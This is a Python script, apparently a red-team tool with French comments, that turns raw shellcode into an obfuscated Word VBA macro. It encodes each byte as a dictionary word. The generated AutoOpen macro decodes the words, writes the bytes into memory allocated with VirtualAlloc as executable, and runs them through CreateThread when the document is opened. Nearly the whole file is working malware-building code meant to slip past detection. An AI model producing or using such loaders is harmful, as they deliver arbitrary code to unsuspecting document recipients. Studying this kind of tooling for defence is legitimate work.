#!/usr/bin/env python3

import sys
import requests
import random
import os
import glob

def get_wordlist(wordlist_source):
    # Si c'est une URL, on télécharge
    if wordlist_source.startswith("http://") or wordlist_source.startswith("https://"):
        response = requests.get(wordlist_source)
        if response.status_code != 200:
            raise Exception("Failed to fetch word list from the provided URL.")
        words = response.content.splitlines()
        words = [word.decode('utf-8') for word in words]
    # Sinon, on lit le fichier local
    else:
        with open(wordlist_source, 'r') as f:
            words = [line.strip() for line in f if line.strip()]
    return words

def select_wordlist():
    # Chemin vers le dossier des wordlists
    wordlist_dir = "wordlists"
    # Vérifier si le dossier existe
    if not os.path.exists(wordlist_dir):
        print(f"Le dossier {wordlist_dir} n'existe pas.")
        return "https://www.mit.edu/~ecprice/wordlist.10000"
    
    # Récupérer toutes les wordlists dans le dossier
    wordlist_files = glob.glob(os.path.join(wordlist_dir, "*.txt"))
    if not wordlist_files:
        print(f"Aucune wordlist trouvée dans {wordlist_dir}.")
        return "https://www.mit.edu/~ecprice/wordlist.10000"
    
    # Afficher le menu des wordlists
    print("\nWordlists disponibles :")
    for i, wordlist in enumerate(wordlist_files, 1):
        print(f"{i}. {os.path.basename(wordlist)}")
    print(f"{len(wordlist_files) + 1}. Utiliser une URL ou un chemin personnalisé")
    
    # Demander à l'utilisateur de choisir
    while True:
        try:
            choice = int(input("\nEntrez le numéro de votre choix : "))
            if 1 <= choice <= len(wordlist_files):
                return wordlist_files[choice - 1]
            elif choice == len(wordlist_files) + 1:
                custom_source = input("Entrez l'URL ou le chemin vers la wordlist : ")
                return custom_source
            else:
                print(f"Veuillez entrer un numéro entre 1 et {len(wordlist_files) + 1}")
        except ValueError:
            print("Veuillez entrer un numéro valide.")

def main(input_file, wordlist_source=None):
    # Si aucune wordlist n'est fournie, afficher le menu de sélection
    if wordlist_source is None:
        wordlist_source = select_wordlist()

    # 1. Dictionnaire de substitution
    words = get_wordlist(wordlist_source)
    random.shuffle(words)
    hex_values = [f'{i:02x}' for i in range(256)]
    word_dict = dict(zip(hex_values, words[:256]))

    # 2. Encodage du shellcode
    encoded_words = []
    with open(input_file, 'rb') as f_in:
        byte = f_in.read(1)
        while byte:
            hex_value = f"{byte.hex()}"
            encoded_words.append(word_dict[hex_value])
            byte = f_in.read(1)

    # Split pour éviter dépassement de longueur VBA
    encoded_chunks = []
    chunk_size = 100
    for i in range(0, len(encoded_words), chunk_size):
        encoded_chunks.append(' '.join(encoded_words[i:i+chunk_size]))

    # Génération du code VBA
    vba_macro = '''\
' --------- OBFUSCATED PAYLOAD MACRO ---------
#If VBA7 Then
    Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Sub RtlMoveMemory Lib "kernel32" (ByVal Destination As LongPtr, ByVal Source As LongPtr, ByVal Length As LongPtr)
    Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As LongPtr, ByVal dwStackSize As LongPtr, ByVal lpStartAddress As LongPtr, ByVal lpParameter As LongPtr, ByVal dwCreationFlags As Long, ByRef lpThreadId As LongPtr) As LongPtr
    Private Declare PtrSafe Function WaitForSingleObject Lib "kernel32" (ByVal hHandle As LongPtr, ByVal dwMilliseconds As Long) As Long
#End If

Sub AutoOpen()
    Dim sc As String
    Dim chun As Variant
    sc = ""
'''

    # Ajoute chaque chunk à la concaténation VBA
    for chunk in encoded_chunks:
        vba_macro += f'    sc = sc & "{chunk} "\n'

    vba_macro += '''
    Dim sc_arr() As String
    Dim bytArr() As Byte
    Dim i As Long

    sc = Trim(sc)
    sc_arr = Split(sc, " ")
    ReDim bytArr(UBound(sc_arr))
    '''

    # Création du dictionnaire pour décodage VBA
    vba_macro += '\n    Dim worddict As Object\n    Set worddict = CreateObject("Scripting.Dictionary")\n'
    for k, v in word_dict.items():
        vba_macro += f'    worddict.Add "{v}", &H{k}\n'

    vba_macro += '''
    For i = 0 To UBound(sc_arr)
        If worddict.Exists(sc_arr(i)) Then
            bytArr(i) = worddict(sc_arr(i))
        Else
            bytArr(i) = 0
        End If
    Next i

    Dim mem As LongPtr
    mem = VirtualAlloc(0, UBound(bytArr) + 1, &H3000, &H40)
    For i = 0 To UBound(bytArr)
        RtlMoveMemory mem + i, VarPtr(bytArr(i)), 1
    Next i

    Dim threadID As LongPtr
    Dim hThread As LongPtr
    hThread = CreateThread(0, 0, mem, 0, 0, threadID)
    WaitForSingleObject hThread, &HFFFFFFFF
End Sub
'''

    print("Macro VBA créée dans 'generated_macro.vba'")
    with open('generated_macro.vba', 'w') as f:
        f.write(vba_macro)

if __name__ == "__main__":
    print("##############################################")
    print("########### VBA PAYLOAD OBFUSCATOR ###########")
    print("##############################################\n")
    if len(sys.argv) < 2:
        print("Usage: python encode_vba.py <path_to_raw_payload_file> [<path_or_url_to_wordlist>]\n")
        sys.exit(1)
    
    file_path = sys.argv[1]
    wordlist_source = sys.argv[2] if len(sys.argv) > 2 else None
    main(file_path, wordlist_source)